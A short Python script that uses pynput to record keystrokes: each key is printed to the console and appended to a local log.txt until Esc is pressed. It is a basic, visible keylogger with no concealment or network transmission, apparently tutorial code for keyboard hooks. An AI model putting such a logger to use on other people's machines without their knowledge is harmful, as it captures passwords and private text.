import pynput
from pynput.keyboard import Key, Listener

def when_pressed(key):
    with open('log.txt', 'a') as file:
        k = str(key).strip("'")
        print(k)
        if key == Key.space:
            file.write(' ')
        elif 'Key' not in k:
            file.write(k)

def when_released(key):
    print(f'{key} released')
    if key == Key.esc:
        return False

with Listener(on_press=when_pressed, on_release=when_released) as listener:
    listener.join()
